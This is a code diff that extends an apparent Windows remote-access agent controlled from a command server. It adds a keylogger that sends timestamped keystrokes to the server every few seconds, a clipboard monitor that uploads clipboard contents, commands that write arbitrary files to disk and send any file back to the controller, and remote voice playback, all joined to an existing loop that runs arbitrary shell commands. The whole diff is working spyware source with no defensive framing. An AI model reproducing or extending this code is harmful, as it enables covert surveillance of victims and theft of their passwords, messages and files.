@@ -10,6 +10,14 @@ import cv2
 import win32api
 import win32con
 import pyaudio
+import base64
+import tempfile
+import win32clipboard
+import pynput
+from pynput import keyboard
+import pygame
+import io
+import wave
 
 SERVER_URL = "http://192.168.100.239:8080"  # Change to your controller's URL
 
@@ -20,6 +28,15 @@ AUDIO_STREAMING_ENABLED = False
 AUDIO_STREAM_THREAD = None
 CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREAD = None
+
+# --- Monitoring State ---
+KEYLOGGER_ENABLED = False
+KEYLOGGER_THREAD = None
+KEYLOG_BUFFER = []
+CLIPBOARD_MONITOR_ENABLED = False
+CLIPBOARD_MONITOR_THREAD = None
+CLIPBOARD_BUFFER = []
+LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 CHUNK = 1024
@@ -198,6 +215,209 @@ def stop_camera_streaming():
         CAMERA_STREAM_THREAD = None
         print("Stopped camera stream.")
 
+# --- Keylogger Functions ---
+
+def on_key_press(key):
+    """Callback for key press events."""
+    global KEYLOG_BUFFER
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            # Regular character
+            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
+        else:
+            # Special key
+            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
+    except Exception as e:
+        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")
+
+def keylogger_worker(agent_id):
+    """Keylogger worker thread that sends data periodically."""
+    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
+    url = f"{SERVER_URL}/keylog_data/{agent_id}"
+    
+    while KEYLOGGER_ENABLED:
+        try:
+            if KEYLOG_BUFFER:
+                # Send accumulated keylog data
+                data_to_send = KEYLOG_BUFFER.copy()
+                KEYLOG_BUFFER = []
+                
+                for entry in data_to_send:
+                    requests.post(url, json={"data": entry}, timeout=5)
+            
+            time.sleep(5)  # Send data every 5 seconds
+        except Exception as e:
+            print(f"Keylogger error: {e}")
+            time.sleep(5)
+
+def start_keylogger(agent_id):
+    """Start the keylogger."""
+    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
+    if not KEYLOGGER_ENABLED:
+        KEYLOGGER_ENABLED = True
+        
+        # Start keyboard listener
+        listener = keyboard.Listener(on_press=on_key_press)
+        listener.daemon = True
+        listener.start()
+        
+        # Start worker thread
+        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
+        KEYLOGGER_THREAD.daemon = True
+        KEYLOGGER_THREAD.start()
+        
+        print("Started keylogger.")
+
+def stop_keylogger():
+    """Stop the keylogger."""
+    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
+    if KEYLOGGER_ENABLED:
+        KEYLOGGER_ENABLED = False
+        if KEYLOGGER_THREAD:
+            KEYLOGGER_THREAD.join(timeout=2)
+        KEYLOGGER_THREAD = None
+        print("Stopped keylogger.")
+
+# --- Clipboard Monitor Functions ---
+
+def get_clipboard_content():
+    """Get current clipboard content."""
+    try:
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        return data
+    except:
+        try:
+            win32clipboard.CloseClipboard()
+        except:
+            pass
+        return None
+
+def clipboard_monitor_worker(agent_id):
+    """Clipboard monitor worker thread."""
+    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
+    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
+    
+    while CLIPBOARD_MONITOR_ENABLED:
+        try:
+            current_content = get_clipboard_content()
+            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
+                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
+                
+                requests.post(url, json={"data": clipboard_entry}, timeout=5)
+                LAST_CLIPBOARD_CONTENT = current_content
+            
+            time.sleep(2)  # Check clipboard every 2 seconds
+        except Exception as e:
+            print(f"Clipboard monitor error: {e}")
+            time.sleep(2)
+
+def start_clipboard_monitor(agent_id):
+    """Start clipboard monitoring."""
+    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
+    if not CLIPBOARD_MONITOR_ENABLED:
+        CLIPBOARD_MONITOR_ENABLED = True
+        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
+        CLIPBOARD_MONITOR_THREAD.daemon = True
+        CLIPBOARD_MONITOR_THREAD.start()
+        print("Started clipboard monitor.")
+
+def stop_clipboard_monitor():
+    """Stop clipboard monitoring."""
+    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
+    if CLIPBOARD_MONITOR_ENABLED:
+        CLIPBOARD_MONITOR_ENABLED = False
+        if CLIPBOARD_MONITOR_THREAD:
+            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
+        CLIPBOARD_MONITOR_THREAD = None
+        print("Stopped clipboard monitor.")
+
+# --- File Management Functions ---
+
+def handle_file_upload(command_parts):
+    """Handle file upload from controller."""
+    try:
+        if len(command_parts) < 3:
+            return "Invalid upload command format"
+        
+        destination_path = command_parts[1]
+        file_content_b64 = command_parts[2]
+        
+        # Decode base64 content
+        file_content = base64.b64decode(file_content_b64)
+        
+        # Ensure directory exists
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        
+        # Write file
+        with open(destination_path, 'wb') as f:
+            f.write(file_content)
+        
+        return f"File uploaded successfully to {destination_path}"
+    except Exception as e:
+        return f"File upload failed: {e}"
+
+def handle_file_download(command_parts, agent_id):
+    """Handle file download request from controller."""
+    try:
+        if len(command_parts) < 2:
+            return "Invalid download command format"
+        
+        file_path = command_parts[1]
+        
+        if not os.path.exists(file_path):
+            return f"File not found: {file_path}"
+        
+        # Read file and encode as base64
+        with open(file_path, 'rb') as f:
+            file_content = base64.b64encode(f.read()).decode('utf-8')
+        
+        # Send file to controller
+        filename = os.path.basename(file_path)
+        url = f"{SERVER_URL}/file_upload/{agent_id}"
+        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
+        
+        return f"File {file_path} sent to controller"
+    except Exception as e:
+        return f"File download failed: {e}"
+
+# --- Voice Communication Functions ---
+
+def handle_voice_playback(command_parts):
+    """Handle voice playback from controller."""
+    try:
+        if len(command_parts) < 2:
+            return "Invalid voice command format"
+        
+        audio_content_b64 = command_parts[1]
+        
+        # Decode base64 audio
+        audio_content = base64.b64decode(audio_content_b64)
+        
+        # Create temporary file
+        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
+            temp_file.write(audio_content)
+            temp_audio_path = temp_file.name
+        
+        # Initialize pygame mixer for audio playback
+        pygame.mixer.init()
+        pygame.mixer.music.load(temp_audio_path)
+        pygame.mixer.music.play()
+        
+        # Wait for playback to finish
+        while pygame.mixer.music.get_busy():
+            time.sleep(0.1)
+        
+        # Clean up
+        pygame.mixer.quit()
+        os.unlink(temp_audio_path)
+        
+        return "Voice message played successfully"
+    except Exception as e:
+        return f"Voice playback failed: {e}"
+
 def execute_command(command):
     """Executes a command and returns its output."""
     try:
@@ -228,6 +448,10 @@ def main_loop(agent_id):
         "stop-audio": stop_audio_streaming,
         "start-camera": lambda: start_camera_streaming(agent_id),
         "stop-camera": stop_camera_streaming,
+        "start-keylogger": lambda: start_keylogger(agent_id),
+        "stop-keylogger": stop_keylogger,
+        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
+        "stop-clipboard": stop_clipboard_monitor,
     }
 
     while True:
@@ -238,6 +462,15 @@ def main_loop(agent_id):
 
             if command in internal_commands:
                 internal_commands[command]()
+            elif command.startswith("upload-file:"):
+                output = handle_file_upload(command.split(":", 2))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("download-file:"):
+                output = handle_file_download(command.split(":", 1), agent_id)
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("play-voice:"):
+                output = handle_voice_playback(command.split(":", 1))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command != "sleep":
                 output = execute_command(command)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
@@ -247,7 +480,9 @@ def main_loop(agent_id):
             pass
         
         # Adaptive sleep to reduce traffic when idle
-        sleep_time = 1 if STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or CAMERA_STREAMING_ENABLED else 5
+        sleep_time = 1 if (STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or 
+                          CAMERA_STREAMING_ENABLED or KEYLOGGER_ENABLED or 
+                          CLIPBOARD_MONITOR_ENABLED) else 5
         time.sleep(sleep_time)
 
 if __name__ == "__main__":
@@ -260,3 +495,5 @@ if __name__ == "__main__":
         stop_streaming()
         stop_audio_streaming()
         stop_camera_streaming()
+        stop_keylogger()
+        stop_clipboard_monitor()
